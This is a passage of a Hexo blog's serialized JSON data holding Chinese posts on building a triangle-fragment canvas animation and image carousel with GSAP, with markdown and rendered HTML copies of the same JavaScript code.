title=\"JavaScript版本\"></a>JavaScript版本</h2><p>现在只有Mozilla公司还在沿用，已没有关注的意义。目前提及浏览器对JavaScript的支持情况，一般都以ECMAScript兼容性和对DOM的支持情况为准。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>JS中的DOM包括DOM核心和DOM HTML，其他处理XML的语言实现自己的接口，例如SVG（Scalable Vector Graphic，可伸缩矢量图）1.0。BOM一直没有统一标准，HTML5有望统一。</p>"},{"title":"三角碎片动效（四）——生成动画","date":"2018-08-07T00:36:16.000Z","_content":"# 前言\n接着上一篇[三角碎片动效（三）——get fragments](/2018/08/06/delaunay-3/)，这篇讲下生成碎片fragments后，怎样生成动画。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n# 概述\n关于动画，我之前也有介绍过[JS动画（一）——定时器详解](/2018/04/09/JS动画之定时器详解/)，其实现在各种场景都在或多或少的使用，入场动画动画一般会直接用css3，有一定逻辑的系列动画一般会用jquery animate或者一些流行的js动画库，例如非常流行强大的[GSAP](https://greensock.com/gsap)动画平台，或者Adobe家族的createJS，还有其他一些轻量的针对特定场景的，如svg，canvas，webgl的动画框架。这篇只作整个流程，动画部分与其他部分衔接介绍，因为对于动画部分也是相对独立的模块，不过是选用一种技术，实现大量dom的过渡动画。\n## 效果展示\n![效果展示](1.gif)\n<!-- more -->\n# 详述\n## 实现代码\n```\nvar imgWidth = 0,\n    imgHeight = 0,\n    xSubNum = 12, //宽度分段数量\n    ySubNum = 12, //高度分段数量\n    offsetRatio = 0.5;\n\n\nvar container = document.getElementById('container');\nvar source = 'images/1.jpg';\n\nwindow.onload = function () {\n\n    var image = new Image();\n    image.onload = function () {\n        \n        play(image);\n    }\n    image.src = source;\n\n};\n\n// 执行动画\nfunction play(image) {\n\n    imgWidth = image.width;\n    imgHeight = image.height;\n\n    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);\n    var fragments = getFragments(vertices, image);\n\n    for (var i = 0; i < fragments.length; i++) {\n        var fragmentCvs = fragments[i].canvas;\n\n        container.appendChild(fragmentCvs);\n\n        TweenMax.fromTo(fragmentCvs, 1, {\n            y: -fragmentCvs.height,\n            opacity: 0\n        }, {\n            y: 0,\n            opacity: 1,\n            ease: Power1.easeInOut\n        })\n\n    }\n\n}\n```\n# 后记\n本示例是使用GSAP动画平台实现的动画，大家可以根据自己喜好选用动画实现技术，无非就是把生成的碎片fragments（一个个canvas元素）有序的放到页面中。","source":"_posts/2018/2018-08-07-delaunay-4.md","raw":"---\ntitle: 三角碎片动效（四）——生成动画\ntags:\n  - 动效\n  - JavaScript\n  - canvas\ncategories:\n  - 前端\ndate: 2018-08-07 08:36:16\n---\n# 前言\n接着上一篇[三角碎片动效（三）——get fragments](/2018/08/06/delaunay-3/)，这篇讲下生成碎片fragments后，怎样生成动画。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n# 概述\n关于动画，我之前也有介绍过[JS动画（一）——定时器详解](/2018/04/09/JS动画之定时器详解/)，其实现在各种场景都在或多或少的使用，入场动画动画一般会直接用css3，有一定逻辑的系列动画一般会用jquery animate或者一些流行的js动画库，例如非常流行强大的[GSAP](https://greensock.com/gsap)动画平台，或者Adobe家族的createJS，还有其他一些轻量的针对特定场景的，如svg，canvas，webgl的动画框架。这篇只作整个流程，动画部分与其他部分衔接介绍，因为对于动画部分也是相对独立的模块，不过是选用一种技术，实现大量dom的过渡动画。\n## 效果展示\n![效果展示](1.gif)\n<!-- more -->\n# 详述\n## 实现代码\n```\nvar imgWidth = 0,\n    imgHeight = 0,\n    xSubNum = 12, //宽度分段数量\n    ySubNum = 12, //高度分段数量\n    offsetRatio = 0.5;\n\n\nvar container = document.getElementById('container');\nvar source = 'images/1.jpg';\n\nwindow.onload = function () {\n\n    var image = new Image();\n    image.onload = function () {\n        \n        play(image);\n    }\n    image.src = source;\n\n};\n\n// 执行动画\nfunction play(image) {\n\n    imgWidth = image.width;\n    imgHeight = image.height;\n\n    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);\n    var fragments = getFragments(vertices, image);\n\n    for (var i = 0; i < fragments.length; i++) {\n        var fragmentCvs = fragments[i].canvas;\n\n        container.appendChild(fragmentCvs);\n\n        TweenMax.fromTo(fragmentCvs, 1, {\n            y: -fragmentCvs.height,\n            opacity: 0\n        }, {\n            y: 0,\n            opacity: 1,\n            ease: Power1.easeInOut\n        })\n\n    }\n\n}\n```\n# 后记\n本示例是使用GSAP动画平台实现的动画，大家可以根据自己喜好选用动画实现技术，无非就是把生成的碎片fragments（一个个canvas元素）有序的放到页面中。","slug":"2018-2018-08-07-delaunay-4","published":1,"updated":"2019-05-28T07:14:01.566Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8q50014wovv8f7uvp06","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/06/delaunay-3/\">三角碎片动效（三）——get fragments</a>，这篇讲下生成碎片fragments后，怎样生成动画。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>关于动画，我之前也有介绍过<a href=\"/2018/04/09/JS动画之定时器详解/\">JS动画（一）——定时器详解</a>，其实现在各种场景都在或多或少的使用，入场动画动画一般会直接用css3，有一定逻辑的系列动画一般会用jquery animate或者一些流行的js动画库，例如非常流行强大的<a href=\"https://greensock.com/gsap\" target=\"_blank\" rel=\"noopener\">GSAP</a>动画平台，或者Adobe家族的createJS，还有其他一些轻量的针对特定场景的，如svg，canvas，webgl的动画框架。这篇只作整个流程，动画部分与其他部分衔接介绍，因为对于动画部分也是相对独立的模块，不过是选用一种技术，实现大量dom的过渡动画。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-07-delaunay-4/1.gif\" alt=\"效果展示\"><br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var imgWidth = 0,</span><br><span class=\"line\">    imgHeight = 0,</span><br><span class=\"line\">    xSubNum = 12, //宽度分段数量</span><br><span class=\"line\">    ySubNum = 12, //高度分段数量</span><br><span class=\"line\">    offsetRatio = 0.5;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">var container = document.getElementById(&apos;container&apos;);</span><br><span class=\"line\">var source = &apos;images/1.jpg&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">window.onload = function () &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    var image = new Image();</span><br><span class=\"line\">    image.onload = function () &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        play(image);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    image.src = source;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 执行动画</span><br><span class=\"line\">function play(image) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    imgWidth = image.width;</span><br><span class=\"line\">    imgHeight = image.height;</span><br><span class=\"line\"></span><br><span class=\"line\">    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);</span><br><span class=\"line\">    var fragments = getFragments(vertices, image);</span><br><span class=\"line\"></span><br><span class=\"line\">    for (var i = 0; i &lt; fragments.length; i++) &#123;</span><br><span class=\"line\">        var fragmentCvs = fragments[i].canvas;</span><br><span class=\"line\"></span><br><span class=\"line\">        container.appendChild(fragmentCvs);</span><br><span class=\"line\"></span><br><span class=\"line\">        TweenMax.fromTo(fragmentCvs, 1, &#123;</span><br><span class=\"line\">            y: -fragmentCvs.height,</span><br><span class=\"line\">            opacity: 0</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            y: 0,</span><br><span class=\"line\">            opacity: 1,</span><br><span class=\"line\">            ease: Power1.easeInOut</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>本示例是使用GSAP动画平台实现的动画，大家可以根据自己喜好选用动画实现技术，无非就是把生成的碎片fragments（一个个canvas元素）有序的放到页面中。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/06/delaunay-3/\">三角碎片动效（三）——get fragments</a>，这篇讲下生成碎片fragments后，怎样生成动画。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>关于动画，我之前也有介绍过<a href=\"/2018/04/09/JS动画之定时器详解/\">JS动画（一）——定时器详解</a>，其实现在各种场景都在或多或少的使用，入场动画动画一般会直接用css3，有一定逻辑的系列动画一般会用jquery animate或者一些流行的js动画库，例如非常流行强大的<a href=\"https://greensock.com/gsap\" target=\"_blank\" rel=\"noopener\">GSAP</a>动画平台，或者Adobe家族的createJS，还有其他一些轻量的针对特定场景的，如svg，canvas，webgl的动画框架。这篇只作整个流程，动画部分与其他部分衔接介绍，因为对于动画部分也是相对独立的模块，不过是选用一种技术，实现大量dom的过渡动画。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-07-delaunay-4/1.gif\" alt=\"效果展示\"><br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var imgWidth = 0,</span><br><span class=\"line\">    imgHeight = 0,</span><br><span class=\"line\">    xSubNum = 12, //宽度分段数量</span><br><span class=\"line\">    ySubNum = 12, //高度分段数量</span><br><span class=\"line\">    offsetRatio = 0.5;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">var container = document.getElementById(&apos;container&apos;);</span><br><span class=\"line\">var source = &apos;images/1.jpg&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">window.onload = function () &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    var image = new Image();</span><br><span class=\"line\">    image.onload = function () &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        play(image);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    image.src = source;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 执行动画</span><br><span class=\"line\">function play(image) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    imgWidth = image.width;</span><br><span class=\"line\">    imgHeight = image.height;</span><br><span class=\"line\"></span><br><span class=\"line\">    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);</span><br><span class=\"line\">    var fragments = getFragments(vertices, image);</span><br><span class=\"line\"></span><br><span class=\"line\">    for (var i = 0; i &lt; fragments.length; i++) &#123;</span><br><span class=\"line\">        var fragmentCvs = fragments[i].canvas;</span><br><span class=\"line\"></span><br><span class=\"line\">        container.appendChild(fragmentCvs);</span><br><span class=\"line\"></span><br><span class=\"line\">        TweenMax.fromTo(fragmentCvs, 1, &#123;</span><br><span class=\"line\">            y: -fragmentCvs.height,</span><br><span class=\"line\">            opacity: 0</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            y: 0,</span><br><span class=\"line\">            opacity: 1,</span><br><span class=\"line\">            ease: Power1.easeInOut</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>本示例是使用GSAP动画平台实现的动画，大家可以根据自己喜好选用动画实现技术，无非就是把生成的碎片fragments（一个个canvas元素）有序的放到页面中。</p>"},{"title":"三角碎片动效（五）——焦点图轮播示例","date":"2018-08-07T01:15:54.000Z","updated":"2018-08-07T01:15:54.000Z","_content":"# 前言\n接着上一篇[三角碎片动效（四）——生成动画](/2018/08/07/delaunay-4/)，这篇讲下具体应用示例：焦点图轮播。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n# 概述\n关于焦点图轮播，大家是最常见到的，也是有大量资源的，例如网页端使用广泛的[swiper](https://www.swiper.com.cn/)。本篇也是实现这样的图片切换，只不过过渡动画是用三角剖分实现的三角碎片动画。\n## 效果展示\n![效果展示](GIF.gif)\n<!-- more -->\n# 详述\n## 实现代码\n```\nvar imgWidth = 0,\n    imgHeight = 0,\n    xSubNum = 6, //宽度分段数量\n    ySubNum = 5, //高度分段数量\n    offsetRatio = 0.5;\n\n\nvar container = document.getElementById('container');\n\nvar sourceArray = [\n    \"images/1.jpg\",\n    \"images/2.jpg\",\n    \"images/3.jpg\",\n    \"images/4.jpg\"\n];\nvar index = 0;\npreloadImg(sourceArray,function(images){\n    slide(images);\n})\n\n// 执行动画\nfunction slide(images) {\n    var image = images[index];\n    imgWidth = image.width;\n    imgHeight = image.height;\n\n    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);\n    var fragments = getFragments(vertices, image);\n    \n    \n    TweenMax.set(container, {\n        perspective: 500\n    });\n\n\n    var cvsArray = [];\n    fragments.forEach(function (element, index) {\n        var fragmentCvs = element.canvas;\n        cvsArray.push(fragmentCvs);\n        container.appendChild(fragmentCvs);\n    })\n\n    TweenMax.staggerFromTo(cvsArray, 0.2, {\n        opacity: 0,\n        z: 100,\n        scale: 2\n    }, {\n        opacity: 1,\n        z: 0,\n        scale: 1\n    }, 0.05, function(){\n        // 完成一幅后切换下一幅\n        container.innerHTML = '';\n        index === sourceArray.length-1 ? index = 0 : index++;\n        slide(images);\n    });\n}\n```\n# 后记\n大家也看到了，这只是一个示例，动画效果很粗糙，如果要实际使用还需要做很多工作。\n\n这也是我接下来要做的：\n\n1，碎片动画完成后增加完整图片的显示（没有裂纹效果）；\n\n2，性能优化，增加缓存，减少dom操作；\n\n3，细节优化，打包；\n\n4，完成一个标准的焦点图轮播组件。","source":"_posts/2018/2018-08-07-delaunay-5.md","raw":"---\ntitle: 三角碎片动效（五）——焦点图轮播示例\ntags:\n  - 动效\n  - JavaScript\n  - canvas\ncategories:\n  - 前端\ndate: 2018-08-07 09:15:54\nupdated: 2018-08-07 09:15:54\n---\n# 前言\n接着上一篇[三角碎片动效（四）——生成动画](/2018/08/07/delaunay-4/)，这篇讲下具体应用示例：焦点图轮播。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n# 概述\n关于焦点图轮播，大家是最常见到的，也是有大量资源的，例如网页端使用广泛的[swiper](https://www.swiper.com.cn/)。本篇也是实现这样的图片切换，只不过过渡动画是用三角剖分实现的三角碎片动画。\n## 效果展示\n![效果展示](GIF.gif)\n<!-- more -->\n# 详述\n## 实现代码\n```\nvar imgWidth = 0,\n    imgHeight = 0,\n    xSubNum = 6, //宽度分段数量\n    ySubNum = 5, //高度分段数量\n    offsetRatio = 0.5;\n\n\nvar container = document.getElementById('container');\n\nvar sourceArray = [\n    \"images/1.jpg\",\n    \"images/2.jpg\",\n    \"images/3.jpg\",\n    \"images/4.jpg\"\n];\nvar index = 0;\npreloadImg(sourceArray,function(images){\n    slide(images);\n})\n\n// 执行动画\nfunction slide(images) {\n    var image = images[index];\n    imgWidth = image.width;\n    imgHeight = image.height;\n\n    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);\n    var fragments = getFragments(vertices, image);\n    \n    \n    TweenMax.set(container, {\n        perspective: 500\n    });\n\n\n    var cvsArray = [];\n    fragments.forEach(function (element, index) {\n        var fragmentCvs = element.canvas;\n        cvsArray.push(fragmentCvs);\n        container.appendChild(fragmentCvs);\n    })\n\n    TweenMax.staggerFromTo(cvsArray, 0.2, {\n        opacity: 0,\n        z: 100,\n        scale: 2\n    }, {\n        opacity: 1,\n        z: 0,\n        scale: 1\n    }, 0.05, function(){\n        // 完成一幅后切换下一幅\n        container.innerHTML = '';\n        index === sourceArray.length-1 ? index = 0 : index++;\n        slide(images);\n    });\n}\n```\n# 后记\n大家也看到了，这只是一个示例，动画效果很粗糙，如果要实际使用还需要做很多工作。\n\n这也是我接下来要做的：\n\n1，碎片动画完成后增加完整图片的显示（没有裂纹效果）；\n\n2，性能优化，增加缓存，减少dom操作；\n\n3，细节优化，打包；\n\n4，完成一个标准的焦点图轮播组件。","slug":"2018-2018-08-07-delaunay-5","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8q90017wovvfcs7s2wt","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/07/delaunay-4/\">三角碎片动效（四）——生成动画</a>，这篇讲下具体应用示例：焦点图轮播。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>关于焦点图轮播，大家是最常见到的，也是有大量资源的，例如网页端使用广泛的<a href=\"https://www.swiper.com.cn/\" target=\"_blank\" rel=\"noopener\">swiper</a>。本篇也是实现这样的图片切换，只不过过渡动画是用三角剖分实现的三角碎片动画。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-07-delaunay-5/GIF.gif\" alt=\"效果展示\"><br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var imgWidth = 0,</span><br><span class=\"line\">    imgHeight = 0,</span><br><span class=\"line\">    xSubNum = 6, //宽度分段数量</span><br><span class=\"line\">    ySubNum = 5, //高度分段数量</span><br><span class=\"line\">    offsetRatio = 0.5;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">var container = document.getElementById(&apos;container&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">var sourceArray = [</span><br><span class=\"line\">    &quot;images/1.jpg&quot;,</span><br><span class=\"line\">    &quot;images/2.jpg&quot;,</span><br><span class=\"line\">    &quot;images/3.jpg&quot;,</span><br><span class=\"line\">    &quot;images/4.jpg&quot;</span><br><span class=\"line\">];</span><br><span class=\"line\">var index = 0;</span><br><span class=\"line\">preloadImg(sourceArray,function(images)&#123;</span><br><span class=\"line\">    slide(images);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">// 执行动画</span><br><span class=\"line\">function slide(images) &#123;</span><br><span class=\"line\">    var image = images[index];</span><br><span class=\"line\">    imgWidth = image.width;</span><br><span class=\"line\">    imgHeight = image.height;</span><br><span class=\"line\"></span><br><span class=\"line\">    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);</span><br><span class=\"line\">    var fragments = getFragments(vertices, image);</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    TweenMax.set(container, &#123;</span><br><span class=\"line\">        perspective: 500</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    var cvsArray = [];</span><br><span class=\"line\">    fragments.forEach(function (element, index) &#123;</span><br><span class=\"line\">        var fragmentCvs = element.canvas;</span><br><span class=\"line\">        cvsArray.push(fragmentCvs);</span><br><span class=\"line\">        container.appendChild(fragmentCvs);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    TweenMax.staggerFromTo(cvsArray, 0.2, &#123;</span><br><span class=\"line\">        opacity: 0,</span><br><span class=\"line\">        z: 100,</span><br><span class=\"line\">        scale: 2</span><br><span class=\"line\">    &#125;, &#123;</span><br><span class=\"line\">        opacity: 1,</span><br><span class=\"line\">        z: 0,</span><br><span class=\"line\">        scale: 1</span><br><span class=\"line\">    &#125;, 0.05, function()&#123;</span><br><span class=\"line\">        // 完成一幅后切换下一幅</span><br><span class=\"line\">        container.innerHTML = &apos;&apos;;</span><br><span class=\"line\">        index === sourceArray.length-1 ? index = 0 : index++;</span><br><span class=\"line\">        slide(images);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>大家也看到了，这只是一个示例，动画效果很粗糙，如果要实际使用还需要做很多工作。</p>\n<p>这也是我接下来要做的：</p>\n<p>1，碎片动画完成后增加完整图片的显示（没有裂纹效果）；</p>\n<p>2，性能优化，增加缓存，减少dom操作；</p>\n<p>3，细节优化，打包；</p>\n<p>4，完成一个标准的焦点图轮播组件。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/07/delaunay-4/\">三角碎片动效（四）——生成动画</a>，这篇讲下具体应用示例：焦点图轮播。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>关于焦点图轮播，大家是最常见到的，也是有大量资源的，例如网页端使用广泛的<a href=\"https://www.swiper.com.cn/\" target=\"_blank\" rel=\"noopener\">swiper</a>。本篇也是实现这样的图片切换，只不过过渡动画是用三角剖分实现的三角碎片动画。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-07-delaunay-5/GIF.gif\" alt=\"效果展示\"><br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var imgWidth = 0,</span><br><span class=\"line\">    imgHeight = 0,</span><br><span class=\"line\">    xSubNum = 6, //宽度分段数量</span><br><span class=\"line\">    ySubNum = 5, //高度分段数量</span><br><span class=\"line\">    offsetRatio = 0.5;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">var container = document.getElementById(&apos;container&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">var sourceArray = [</span><br><span class=\"line\">    &quot;images/1.jpg&quot;,</span><br><span class=\"line\">    &quot;images/2.jpg&quot;,</span><br><span class=\"line\">    &quot;images/3.jpg&quot;,</span><br><span class=\"line\">    &quot;images/4.jpg&quot;</span><br><span class=\"line\">];</span><br><span class=\"line\">var index = 0;</span><br><span 